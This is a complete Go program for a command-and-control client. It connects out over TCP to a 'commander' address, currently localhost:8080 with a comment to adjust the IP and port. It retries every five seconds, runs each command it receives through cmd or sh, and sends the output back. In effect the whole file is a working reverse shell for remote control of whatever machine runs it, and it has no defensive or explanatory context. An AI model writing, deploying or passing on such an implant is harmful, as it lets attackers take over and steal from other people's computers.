package main

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
    "runtime"
    "time"
)

func main() {
    // Commander's address: Adjust the IP and port as necessary
    commanderAddress := "localhost:8080"

    for {
        conn, err := net.Dial("tcp", commanderAddress)
        if err != nil {
            fmt.Println("Error connecting:", err.Error())
            fmt.Println("Retrying in 5 seconds...")
            time.Sleep(5 * time.Second) // Wait before retrying
            continue
        }
        fmt.Println("Connected to commander at", commanderAddress)
        handleConnection(conn)
    }
}

func handleConnection(conn net.Conn) {
    for {
        // Listen for a command
        command, err := bufio.NewReader(conn).ReadString('\n')
        if err != nil {
            fmt.Println("Lost connection to commander. Error reading:", err.Error())
            return // Exit the loop and attempt to reconnect
        }
        fmt.Println("Executing command:", command)

        // Execute the command
        output, err := executeCommand(command)
        if err != nil {
            conn.Write([]byte("Error executing command: " + err.Error() + "\n"))
            continue
        }

        // Send back the output
        conn.Write([]byte(output + "\n"))
    }
}

func executeCommand(commandStr string) (string, error) {
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", commandStr)
    } else {
        cmd = exec.Command("sh", "-c", commandStr)
    }
    output, err := cmd.CombinedOutput()
    return string(output), err
}
